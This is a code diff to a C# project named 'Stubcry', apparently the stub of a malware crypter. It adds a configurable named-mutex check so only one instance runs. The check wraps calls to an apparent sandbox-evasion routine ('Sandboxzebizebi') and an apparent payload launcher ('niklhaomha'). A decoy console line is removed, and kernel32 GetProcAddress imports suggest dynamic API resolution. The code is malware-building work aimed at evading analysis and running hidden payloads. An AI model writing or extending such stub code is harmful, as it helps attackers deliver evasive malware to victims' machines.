@@ -41,6 +41,42 @@ namespace Stubcry
             [FieldOffset(64)]
             public ushort wShowWindow;
         }
+
+
+        static Mutex hotMutex()
+        {
+            var keyword = config.Mutex;
+            Mutex mutex = null;
+
+            try
+            {
+
+                mutex = Mutex.OpenExisting(keyword);
+            }
+            catch (WaitHandleCannotBeOpenedException)
+            {
+                mutex = new Mutex(false, keyword);
+            }
+
+            if (mutex.WaitOne(TimeSpan.Zero, true))
+            {
+                return mutex;
+            }
+            else
+            {
+                mutex.Close();
+                return null;
+            }
+        }
+
+        static void sayebMutex(Mutex mutex)
+        {
+            if (mutex != null)
+            {
+                mutex.ReleaseMutex();
+                mutex.Dispose();
+            }
+        }
         [DllImport("kernel32")]
         public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
         [DllImport("kernel32")]
@@ -416,13 +452,29 @@ namespace Stubcry
         [STAThread]
         static void Main()
         {
-            Console.WriteLine("Normal Task");
-            Application.EnableVisualStyles();
-            Application.SetCompatibleTextRenderingDefault(false);
+            var mutexstep = hotMutex();
+            if (mutexstep != null)
+            {
+                try
+                {
 
-            Sandboxzebizebi();
-            Thread.Sleep(1000);
-            niklhaomha("3ASBA");
+                    Application.EnableVisualStyles();
+                    Application.SetCompatibleTextRenderingDefault(false);
+
+                    Sandboxzebizebi();
+                    Thread.Sleep(1000);
+                    niklhaomha("3ASBA");
+
+                }
+                finally
+                {
+                    sayebMutex(mutexstep);
+                }
+            }
+            else
+            {
+                Environment.Exit(0);
+            }
 
 
 
